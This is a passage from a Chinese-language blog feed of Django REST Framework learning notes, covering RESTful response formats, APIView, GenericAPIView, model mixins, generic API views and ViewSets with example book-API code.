<p>往往涉及数据的各种过滤操作及表现形式 - 筛选、排序、限制，如</p>
<ul>
<li>api.baidu.com/books/?search=西&amp;ordering=-price&amp;limit=3</li>
</ul>
<h2 id="响应数据">响应数据</h2>
<p>API返回的数据，一般为Json格式，如</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="attr">"errcode"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"msg"</span>: <span class="string">"Query success."</span>,</span><br><span class="line">    <span class="attr">"body"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="number">2</span>,</span><br><span class="line">            <span class="attr">"location"</span>: <span class="string">"116.298457,39.848625"</span>,</span><br><span class="line">            <span class="attr">"radius"</span>: <span class="number">41</span>,</span><br><span class="line">            <span class="attr">"country"</span>: <span class="string">"中国"</span>,</span><br><span class="line">            <span class="attr">"province"</span>: <span class="string">"北京市"</span>,</span><br><span class="line">            <span class="attr">"city"</span>: <span class="string">"北京市"</span>,</span><br><span class="line">            <span class="attr">"citycode"</span>: <span class="string">"131"</span>,</span><br><span class="line">            <span class="attr">"district"</span>: <span class="string">"丰台区"</span>,</span><br><span class="line">            <span class="attr">"road"</span>: <span class="string">"丰台南路44号"</span>,</span><br><span class="line">            <span class="attr">"ctime"</span>: <span class="string">"1551178833"</span>,</span><br><span class="line">            <span class="attr">"indoor"</span>: <span class="string">"1"</span>,</span><br><span class="line">            <span class="attr">"error"</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>响应状态码：由开发者（前端、后端、客户）定义，是对资源请求结果的应用层状态码，非HTTP响应状态码。
<ul>
<li>常见字段名示例：
<ul>
<li><code>&quot;status&quot;</code></li>
<li><code>&quot;errcode&quot;</code></li>
</ul></li>
<li>常见值示例：
<ul>
<li><code>0</code>: 表示操作资源成功</li>
<li><code>1</code>: 表示操作资源失败</li>
<li><code>2</code>: 表示操作资源成功，但没匹配结果</li>
</ul></li>
</ul></li>
<li>响应状态码文字说明
<ul>
<li>常见字段名示例
<ul>
<li><code>&quot;msg&quot;</code></li>
<li><code>&quot;message&quot;</code></li>
</ul></li>
</ul></li>
<li>资源本身
<ul>
<li>常见字段名示例
<ul>
<li><code>&quot;data&quot;</code></li>
<li><code>&quot;results&quot;</code></li>
</ul></li>
</ul></li>
</ol>
<p>注意：不能直接返回的资源(子资源、图片、视频等资源)，而是返回该资源的url链接</p>
<h1 id="基于restful规范的原生django接口">基于restful规范的原生Django接口</h1>
<p>测试代码及数据请参见 <a href="https://github.com/dog-2/hello_drf/tree/master/no1_my_restapi" target="_blank" rel="noopener">demo项目 <code>no1_my_restapi</code></a></p>
<div class="note warning">
            <p>原生接口对<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdqdW41MTU5L2FydGljbGUvZGV0YWlscy80Nzc4MTQ0Mw==">各种格式的POST数据<i class="fa fa-external-link-alt"></i></span>的支持情况如下：</p><ul><li>[x] form-data</li><li>[x] x-www-form-urlencoded</li><li>[ ] <del>raw：包括 常见的json、xml等</del></li></ul><p>也就是说 <strong>原生接口并不支持对POST请求中json数据的自动解析，后端只能拿到整个json字符串</strong></p>
          </div>
<h1 id="drf---django-rest-framework">DRF - Django REST Framework</h1>
<p>DRF有如下主要模块：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView, ...                      <span class="comment"># 视图模块 - 对django原生视图类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response, ...                  <span class="comment"># 响应模块 - 对django原生响应类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.request <span class="keyword">import</span> Request, ...                    <span class="comment"># 请求模块 - 对django原生请求类的封装</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> Serializer, ...             <span class="comment"># 序列化与反序列化模块</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.settings <span class="keyword">import</span> APISettings                    <span class="comment"># DRF的配置文件</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.filters <span class="keyword">import</span> SearchFilter, ...               <span class="comment"># RESTful API 基础功能 - 过滤</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.pagination <span class="keyword">import</span> PageNumberPagination, ...    <span class="comment"># RESTful API 基础功能 - 分页</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.authentication <span class="keyword">import</span> TokenAuthentication, ... <span class="comment"># RESTful API 基础功能 - 认证</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.permissions <span class="keyword">import</span> IsAuthenticated, ...        <span class="comment"># RESTful API 基础功能 - 权限（是否登录）</span></span><br><span class="line"><span class="keyword">from</span> rest_framework.throttling <span class="keyword">import</span> SimpleRateThrottle           <span class="comment"># RESTful API 基础功能 - 频率</span></span><br></pre></td></tr></table></figure>
<p>可以看到 DRF 在 django原有基础上进行类封装，并实现类 RESTful API的各大基础功能。</p>
<p>原生View不同，DRF实现了对json格式的POST请求数据的自动解析：</p>
<ul>
<li>[x] form-data</li>
<li>[x] x-www-form-urlencoded</li>
<li>[x] raw：包括 常见的json、xml等</li>
</ul>
<h1 id="扩展阅读">扩展阅读</h1>
<ul>
<li><strong><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVzdGFwaXR1dG9yaWFsLmNvbS8=">A RESTful Tutorial<i class="fa fa-external-link-alt"></i></span></strong></li>
<li><strong>API Design Cheat Sheet</strong>: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldC9ibG9iL21hc3Rlci9SRUFETUUtemgtSGFucy5tZA==">中文<i class="fa fa-external-link-alt"></i></span> / <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Jlc3RDaGVhdFNoZWV0L2FwaS1jaGVhdC1zaGVldCNhcGktZGVzaWduLWNoZWF0LXNoZWV0">EN<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cDovL2RyZi5qaXV5b3UuaW5mby8jLw==">DRF API 指南<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9xMW1pLmdpdGh1Yi5pby9EamFuZ28tUkVTVC1mcmFtZXdvcmstZG9jdW1lbnRhdGlvbi8=">DRF 官方文档（历史版本）中文翻译<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyaWZhbi9odHRwX3Jlc3RmdWxfYXBp">HTTP后台端：RESTful API接口设计<i class="fa fa-external-link-alt"></i></span></li>
</ul>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Learning Notes</tag>
        <tag>Tech</tag>
        <tag>Dev</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST Framework</tag>
        <tag>DRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Django REST Framework 学习笔记（十）：通用视图、视图工具类、视图集以及路由</title>
    <url>/tech/drf-learning-notes-10-generic-views-mixins-viewsets-and-routers/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Django REST Framework Learning Notes (10): Generic Views, MixIns, ViewSets and Routers</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr />
<h1 id="基本信息">基本信息</h1>
<ul>
<li>源码
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3MucHk=">rest_framework.views<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvZ2VuZXJpY3MucHk=">rest_framework.generics<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvdmlld3NldHMucHk=">rest_framework.viewsets<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2VuY29kZS9kamFuZ28tcmVzdC1mcmFtZXdvcmsvYmxvYi9tYXN0ZXIvcmVzdF9mcmFtZXdvcmsvcm91dGVycy5weQ==">rest_framework.routers<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li>官方文档
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvZ2VuZXJpYy12aWV3cy8=">API Guild - Generic views<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvdmlld3NldHMv">API Guild - ViewSets<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZGphbmdvLXJlc3QtZnJhbWV3b3JrLm9yZy9hcGktZ3VpZGUvcm91dGVycy8=">API Guild - Routers<i class="fa fa-external-link-alt"></i></span></li>
</ul></li>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hlbGxvX2RyZi90cmVlL21hc3Rlci9ubzEwX2RyZl92aWV3cw==">本文demo代码Github<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>
<h1 id="aipview---api视图类">AIPView - API视图类</h1>
<p><code>APIView</code>是Django REST Framework提供的所有视图的基类，继承自Django的<code>View</code>父类。</p>
<h2 id="与django-view的不同">与Django <code>View</code>的不同</h2>
<ol type="1">
<li>传入到视图方法中的是REST framework的<code>Request</code>对象，而不是Django的<code>HttpRequeset</code>对象</li>
<li>视图方法可以返回REST framework的<code>Response</code>对象，视图会为响应数据设置（render）符合前端要求的格式</li>
<li>任何<code>APIException</code>异常都会被捕获到，并且处理成合适的响应信息</li>
<li>在进行<code>dispatch()</code>分发前，会对请求进行身份认证、权限检查、流量控制</li>
</ol>
<h2 id="重要类属性">重要类属性</h2>
<p><code>AIPView</code>有如下可设置的重要类属性：</p>
<ul>
<li><code>authentication_classes</code>：列表或元祖，身份认证类</li>
<li><code>permissoin_classes</code>：列表或元祖，权限检查类</li>
<li><code>throttle_classes</code>：列表或元祖，流量控制类</li>
</ul>
<h2 id="示例代码">示例代码</h2>
<p>在<code>APIView</code>中仍有<code>get()</code>，<code>post()</code>等其他请求方式的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"></span><br><span class="line"><span class="comment"># path('books/', views.BookListView.as_view()),</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListView</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        books = BookInfo.objects.all()</span><br><span class="line">        serializer = BookInfoSerializer(books, many=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> Response(serializer.data)</span><br></pre></td></tr></table></figure>
<h1 id="genericapiview---通用api视图类">GenericAPIView - 通用API视图类</h1>
<p>通用API视图类<code>GenericAPIView</code>继承自<code>APIView</code>，完全兼容<code>APIView</code>，主要增加了操作序列化器和数据库查询的方法，作用是为下面<code>Mixin</code>扩展类的执行提供基础类支持。通常在使用时，可以配合一个或多个<code>Mixin</code>扩展类。</p>
<h2 id="genericapiview比apiview多了什么"><code>GenericAPIView</code>比<code>APIView</code>多了什么</h2>
<ol type="1">
<li><code>get_queryset()</code>：从类属性<code>queryset中</code>获得<code>model</code>的<code>queryset</code>数据。群操作就走<code>get_queryset()</code>方法(包括群查，群增等)。</li>
<li><code>get_object()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据，再通过有名分组<code>pk</code>确定唯一操作对象。单操作就走<code>get_object()</code>方法（包括单查，单增等）。</li>
<li><code>get_serializer()</code>：从类属性<code>serializer_class</code>中获得<code>serializer</code>的序列化类。</li>
</ol>
<h2 id="重要类属性-1">重要类属性</h2>
<p><code>GenericAPIView</code>有如下可设置的重要类属性：</p>
<ul>
<li>列表视图与详情视图共用
<ul>
<li><code>queryset</code>：指明视图需要的数据（<code>model</code>查询数据）</li>
<li><code>permissoin_classes</code>：指明视图使用的序列化器</li>
</ul></li>
<li>列表视图使用
<ul>
<li><code>pagination_class</code>：指定分页控制类</li>
<li><code>filter_backends</code>：指定过滤控制后端</li>
</ul></li>
<li>详情页视图使用
<ul>
<li><code>lookup_field</code>：自定义主键，有名分组的查询，默认是<code>pk</code></li>
<li><code>lookup_url_kwarg</code>：查询单一数据时url中的参数关键字名称，默认与<code>look_field</code>相同</li>
</ul></li>
</ul>
<h2 id="重要类方法">重要类方法</h2>
<ul>
<li><code>get_queryset()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据　　</li>
<li><code>get_object()</code>：从类属性<code>queryset</code>中获得<code>model</code>的<code>queryset</code>数据，再通过有名分组<code>pk</code>来确定唯一操作对象</li>
<li><code>get_serializer()</code>：从类属性<code>serializer_class</code>中获得<code>serializer</code>的序列化类，主要用来提供给<code>Mixin</code>扩展类使用</li>
</ul>
<h2 id="get_serializer-源码"><code>get_serializer</code> 源码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_serializer</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Return the serializer instance that should be used for validating and</span></span><br><span class="line"><span class="string">    deserializing input, and for serializing output.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    serializer_class = self.get_serializer_class()</span><br><span class="line">    kwargs[<span class="string">'context'</span>] = self.get_serializer_context()</span><br><span class="line">    <span class="keyword">return</span> serializer_class(*args, **kwargs)</span><br></pre></td></tr></table></figure>
<h2 id="示例代码-1">示例代码</h2>
<h3 id="视图层-views.py">视图层 <code>views.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericAPIView</span><span class="params">(GenericAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line">    lookup_field = <span class="string">'pk'</span>  <span class="comment"># 先定义好，单查可以使用，默认是pk  自定义主键的有名分组，如果路由有名分组不是pk,这个属性就要自己设置了</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 群取</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        book_query = self.get_queryset()  <span class="comment"># 获取queryset数据（model查询数据）</span></span><br><span class="line">        book_ser = self.get_serializer(book_query, many=<span class="literal">True</span>)</span><br><span class="line">        book_data = book_ser.data</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=book_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># # 单取</span></span><br><span class="line">    <span class="comment"># def get(self, request, *args, **kwargs):</span></span><br><span class="line">    <span class="comment">#     book_query = self.get_object()</span></span><br><span class="line">    <span class="comment">#     book_ser = self.get_serializer(book_query)</span></span><br><span class="line">    <span class="comment">#     book_data = book_ser.data</span></span><br><span class="line">    <span class="comment">#     return APIResponse(results=book_data)</span></span><br></pre></td></tr></table></figure>
<h3 id="路由层-urls.py">路由层 <code>urls.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v2/books/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v2/books/&lt;pk&gt;/'</span>, views.BookGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="xxxmodelmixin---视图类的模型工具集"><code>xxxModelMixin</code> - 视图类的模型工具集</h1>
<h2 id="作用">作用</h2>
<ul>
<li>提供了几种后端视图（对数据资源的增删改查）处理流程的实现，如果需要编写的视图属于这五种，则视图可以通过继承相应的扩展类来复用代码，减少自己编写的代码量。</li>
<li><code>mixins</code>有五个工具类文件，一共提供了五个工具类，六个工具方法：单查、群查、单增、单删、单整体改、单局部改</li>
</ul>
<h2 id="使用">使用</h2>
<ul>
<li>继承工具类可以简化请求函数的实现体，但是必须继承<code>GenericAPIView</code>，需要<code>GenericAPIView</code>类提供序列化器与数据库查询的方法(见上方<code>GenericAPIView</code>基类知识点)</li>
<li>工具类的工具方法返回值都是<code>Response</code>类型对象，如果要格式化数据格式再返回给前台，可以通过<code>response.data</code>拿到工具方法返回的<code>Response</code>类型对象的响应数据</li>
</ul>
<h2 id="五大模型工具类">五大模型工具类</h2>
<h3 id="listmodelmixin-群查"><code>ListModelMixin</code> 群查</h3>
<ul>
<li>列表视图扩展类，提供<code>list</code>方法快速实现查询视图</li>
<li>返回<code>200</code>状态码</li>
<li>除了查询，该<code>list</code>方法会对数据进行过滤和分页</li>
</ul>
<h3 id="createmodelmixin-单增"><code>CreateModelMixin</code> 单增</h3>
<ul>
<li>创建视图扩展类，提供<code>create</code>方法快速创建资源的视图，成功返回<code>201</code>的状态码</li>
<li><strong>没有群增的方法，需要自己手动写</strong></li>
</ul>
<h3 id="retrievemodelmixin-单查"><code>RetrieveModelMixin</code> 单查</h3>
<ul>
<li>详情视图扩展类，提供<code>retrieve</code>方法，可以快速实现返回一个存在的数据对象</li>
</ul>
<h3 id="updatemodelmixin-更新修改"><code>UpdateModelMixin</code> 更新/修改</h3>
<ul>
<li>更新视图扩展类，提供<code>update</code>方法，可以快速实现更新一个存在的数据对象，同时也提供<code>partial_update</code>方法，可以实现局部更新</li>
<li><strong>只有单整体改和单局部改，没有群整体改和群局部改</strong></li>
</ul>
<h3 id="destorymodelmixin-删除"><code>DestoryModelMixin</code> 删除</h3>
<ul>
<li>删除视图扩展类，提供<code>destory</code>方法，可以快速实现删除一个存在数据对象</li>
<li>一般不怎么用到，因为实际开发中并不会真的删除数据，而是修改是否可用的标记</li>
</ul>
<h2 id="示例代码-2">示例代码</h2>
<h3 id="视图层-views.py-1">视图层 <code>views.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.mixins <span class="keyword">import</span> ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookMixinGenericAPIView</span><span class="params">(ListModelMixin, CreateModelMixin, RetrieveModelMixin, UpdateModelMixin, GenericAPIView)</span>:</span></span><br><span class="line">    <span class="comment"># GenericAPIView提供的序列化器和查询的数据</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单查和群查</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'pk'</span> <span class="keyword">in</span> kwargs:</span><br><span class="line">            <span class="comment"># 单查  RetrieveModelMixin方法</span></span><br><span class="line">            response = self.retrieve(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># mixins提供的list方法的响应对象是Response，将该对象格式化为自定义的APIResponse</span></span><br><span class="line">            response = self.list(request, *args, **kwargs)  <span class="comment"># 群查 ListModelMixin</span></span><br><span class="line">        <span class="comment"># response的数据都存放在response.data中</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单增</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.create(request, *args, **kwargs)  <span class="comment"># CreateModelMixin方法</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单整体修改</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.update(request, *args, **kwargs)  <span class="comment"># UpdateModelMixin</span></span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 单局部修改</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">patch</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        response = self.partial_update(request, *args, **kwargs)</span><br><span class="line">        <span class="keyword">return</span> APIResponse(results=response.data)</span><br></pre></td></tr></table></figure>
<h3 id="路由层-urls.py-1">路由层 <code>urls.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v3/books/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">    path(<span class="string">'v3/books/&lt;pk&gt;/'</span>, views.BookMixinGenericAPIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="xxxapiview---功能性子视图类">xxxAPIView - 功能性子视图类</h1>
<p>功能性子视图类继承了<code>GenericAPIView</code>和各种<code>Mixins</code>工具类</p>
<ol type="1">
<li>功能性视图类都是<code>GenericAPIView</code>的子类，且不同的子类继承了不同的工具类</li>
<li>工功能性视图类的功能可以满足需求，只需要继承工具视图，并且提供<code>queryset</code>与<code>serializer_class</code>即可</li>
</ol>
<h2 id="各大功能子视图类">各大功能子视图类</h2>
<p>一表胜千言：</p>
<table>
<colgroup>
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th>视图</th>
<th>作用</th>
<th>请求类型</th>
<th>父类</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ListAPIView</td>
<td>查询多条数据</td>
<td>get</td>
<td>GenericAPIView <br/> ListModelMixin</td>
</tr>
<tr class="even">
<td>CreateAPIView</td>
<td>新增一条数据</td>
<td>post</td>
<td>GenericAPIView <br/> CreateModelMixin</td>
</tr>
<tr class="odd">
<td>RetrieveAPIView</td>
<td>查询一条数据</td>
<td>get</td>
<td>GenericAPIView <br/> RetrieveModelMixin</td>
</tr>
<tr class="even">
<td>UpdateAPIView</td>
<td>修改一条数据</td>
<td>put <br/> patch</td>
<td>GenericAPIView <br/>UpdateModelMixin</td>
</tr>
<tr class="odd">
<td>DestroyAPIView</td>
<td>删除一条数据</td>
<td>delete</td>
<td>GenericAPIView <br/> DestroyModelMixin</td>
</tr>
<tr class="even">
<td>RetrieveUpdateAPIView</td>
<td>单查 <br/> 更新一条数据</td>
<td>get<br/>put<br/>patch</td>
<td>GenericAPIView<br/>RetrieveModelMixin<br/>UpdateModelMixin</td>
</tr>
<tr class="odd">
<td>RetrieveUpdateDestroyAPIView</td>
<td>单查<br/>更新<br/>删除一条数据</td>
<td>get<br/>put<br/>patch<br/>delete</td>
<td>GenericAPIView<br/> RetrieveModelMixin<br/>UpdateModelMixin<br/>DestroyModelMixin</td>
</tr>
<tr class="even">
<td>ListCreateAPIView</td>
<td>群查<br/>更新一条</td>
<td>get<br/>post</td>
<td>GenericAPIView<br/>ListModelMixin<br/>mixins.CreateModelMixin</td>
</tr>
</tbody>
</table>
<h2 id="示例代码-3">示例代码</h2>
<h3 id="视图层-views.py-2">视图层 <code>views.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.generics <span class="keyword">import</span> ListCreateAPIView, UpdateAPIView</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookListCreatePIView</span><span class="params">(ListCreateAPIView, UpdateAPIView)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br></pre></td></tr></table></figure>
<h3 id="路由层-urls.py-2">路由层 <code>urls.py</code></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v4/books/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">    path(<span class="string">'v4/books/&lt;pk&gt;/'</span>, views.BookListCreatePIView.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="xxxviewset---视图集">xxxViewset - 视图集</h1>
<h2 id="常用视图集父类">常用视图集父类</h2>
<h3 id="viewsetmixin">ViewSetMixin</h3>
<p><code>ViewSetMixin</code>主要是自定义了<code>as_view</code>方法，使可以通过其参数指定 <code>HTTP_METHOD</code>与函数的映射关系，如 <code>view = MyViewSet.as_view({'get': 'list', 'post': 'create'})</code></p>
<h3 id="viewset">ViewSet</h3>
<p>继承自<code>APIView</code>和<code>ViewSetMixin</code>，没有提供任何方法，需要自己写</p>
<h3 id="genericviewset">GenericViewSet</h3>
<p>继承<code>GenericAPIView</code>和<code>ViewSetMixin</code>，其中<code>GenericAPIView</code>提供了基础方法，可以直接搭配<code>Mixin</code>扩展类使用，因此比较常用</p>
<h3 id="modelviewset">ModelViewSet　　</h3>
<p>继承<code>GenericViewset</code>，但同时也包括<code>ListModelMixin</code>、<code>CreateModelMixin</code>等<code>mixin</code>扩展类</p>
<h2 id="源码分析">源码分析</h2>
<ol type="1">
<li>视图集都是默认优先继承<code>ViewSetMixin</code>类，再继承一个视图类（<code>GenericAPIView</code>或<code>APIView</code>）</li>
<li><code>ViewSetMixin</code>提供了重写的<code>as_view()</code>方法，继承视图集的视图类，配置路由时调用<code>as_view()</code>必须传入 请求名-函数名 映射关系字典</li>
</ol>
<p>例如:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">path(<span class="string">'v5/books/'</span>, views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br></pre></td></tr></table></figure>
<p>表示<code>get</code>请求会交给<code>my_get_list</code>视图函数处理</p>
<h2 id="genericviewset-示例代码">GenericViewSet 示例代码</h2>
<h3 id="路由层-urls.py-3">路由层 urls.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">       <span class="comment"># View的as_view()：将get请求映射到视图类的get方法</span></span><br><span class="line">    <span class="comment"># ViewSet的as_view(&#123;'get': 'my_get_list'&#125;)：将get请求映射到视图类的my_get_list方法</span></span><br><span class="line">    path(<span class="string">'v5/books/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_list'</span>&#125;)),</span><br><span class="line">    path(<span class="string">'v5/books/&lt;pk&gt;/'</span>,</span><br><span class="line">         views.BookGenericViewSet.as_view(&#123;<span class="string">'get'</span>: <span class="string">'my_get_obj'</span>&#125;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h3 id="视图层-views.py-3">视图层 views.py</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.viewsets <span class="keyword">import</span> GenericViewSet</span><br><span class="line"><span class="keyword">from</span> rest_framework <span class="keyword">import</span> mixins  <span class="comment">#工具集 可以使用list,retrieve等方法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookGenericViewSet</span><span class="params">(RetrieveModelMixin, ListModelMixin, GenericViewSet)</span>:</span></span><br><span class="line">    queryset = models.Book.objects.filter(is_delete=<span class="literal">False</span>)</span><br><span class="line">    serializer_class = serializers.BookModelSerializer</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_list</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.list(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_get_obj</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.retrieve(request, *args, **kwargs)</span><br></pre></td></tr></table></figure>
<h2 id="genericviewset与viewset"><code>GenericViewSet</code>与<code>ViewSet</code></h2>
<h3 id="异同">异同</h3>
<ol type="1">
<li><code>GenericViewSet</code>和<code>ViewSet</code>都继承了<code>ViewSetMixin</code>，<code>as_view</code>都可以配置 请求-函数 映射</li>
<li><code>GenericViewSet</code>继承的是<code>GenericAPIView</code>视图类，用来完成标准的 <code>model</code> 类操作接口</li>
<li><code>ViewSet</code>继承的是<code>APIView</code>视图类，用来完成不需要 <code>model</code> 类参与，或是非标准的 <code>model</code> 类操作接口，如
<ul>
<li><code>post</code>请求在标准的 <code>model</code> 类操作下就是新增接口，登陆的<code>post</code>不满足。登陆的post请求，并不是完成数据的新增，只是用post提交数据，得到的结果也不是登陆的用户信息，而是登陆的认证信息</li>
<li><code>post</code>请求验证码的接口，不需要 <code>model</code> 类的参与</li>
</ul></li>
